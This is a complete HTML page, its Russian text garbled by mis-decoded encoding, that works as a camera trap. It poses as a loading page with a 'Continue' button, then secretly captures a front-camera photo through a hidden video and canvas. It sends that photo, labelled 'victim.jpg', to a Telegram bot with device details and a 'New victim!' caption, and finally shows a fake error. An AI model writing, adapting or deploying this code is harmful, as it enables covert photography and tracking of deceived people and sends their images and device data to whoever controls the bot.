<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .message {
            text-align: center;
            opacity: 0.8;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .btn {
            background: #fff;
            color: #000;
            border: none;
            padding: 15px 40px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.95); }
        .hidden { display: none !important; }
        video, canvas { position: absolute; opacity: 0; pointer-events: none; }
        .error {
            display: none;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div id="step1">
        <div class="loader"></div>
        <div class="message">
            –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞...<br>
            <small style="opacity: 0.6;">–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è</small>
        </div>
        <button class="btn" onclick="startCamera()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="step2" class="hidden">
        <div class="loader"></div>
        <div class="message">–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ...</div>
    </div>

    <div id="error" class="error">
        <h2>‚ö†Ô∏è</h2>
        <p>–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        const chatId = urlParams.get('chat');
        const trapId = urlParams.get('id') || 'unknown';

        if (!token || !chatId) {
            document.body.innerHTML = '<div style="color:white; padding:20px;">–û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω–∞—è —Å—Å—ã–ª–∫–∞</div>';
        }

        async function startCamera() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });

                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        captureAndSend(stream);
                    }, 1500);
                };
            } catch (err) {
                console.error('Camera error:', err);
                sendToTelegram(null);
                showError();
            }
        }

        function captureAndSend(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob((blob) => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.8);

            setTimeout(showError, 1000);
        }

        async function sendToTelegram(photoBlob) {
            try {
                const deviceInfo = `üé£ –ù–æ–≤–∞—è –∂–µ—Ä—Ç–≤–∞!

üÜî ID: ${trapId}
üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.platform}
üåê –Ø–∑—ã–∫: ${navigator.language}
üìè –≠–∫—Ä–∞–Ω: ${screen.width}x${screen.height}
üïê –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üë§ User Agent: ${navigator.userAgent.substring(0, 50)}...`;

                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', photoBlob, 'victim.jpg');
                    formData.append('caption', deviceInfo);

                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: deviceInfo + '

‚ö†Ô∏è –§–æ—Ç–æ –Ω–µ –ø–æ–ª—É—á–µ–Ω–æ'
                        })
                    });
                }
            } catch (err) {
                console.error('Telegram error:', err);
            }
        }

        function showError() {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('error').style.display = 'block';
        }
    </script>
</body>
</html>